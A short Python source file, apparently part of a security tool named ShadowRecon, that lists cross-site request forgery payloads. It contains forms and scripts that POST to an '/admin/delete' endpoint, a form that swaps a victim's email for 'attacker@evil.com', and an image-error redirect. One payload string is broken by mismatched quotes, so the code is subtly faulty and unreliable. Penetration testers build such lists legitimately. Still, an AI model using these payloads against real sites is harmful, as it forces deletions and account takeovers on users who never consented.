"""
CSRF Payloads for ShadowRecon v1.0
"""

class CSRFPayloads:
    """CSRF test payloads"""

    HTML_FORMS = [
        '<form action="/admin/delete" method="post"><input type="submit" value="Delete"></form>',
        '<form action="/user/update" method="post"><input name="email" value="attacker@evil.com"><input type="submit"></form>',
        '<img src="/logout" onerror="this.src='/admin/delete'">',
    ]

    JAVASCRIPT_CSRF = [
        '<script>fetch("/admin/delete", {method:"POST"})</script>',
        '<script>var xhr=new XMLHttpRequest();xhr.open("POST","/admin/delete");xhr.send();</script>',
    ]

    @classmethod
    def get_csrf_payloads(cls):
        return cls.HTML_FORMS + cls.JAVASCRIPT_CSRF
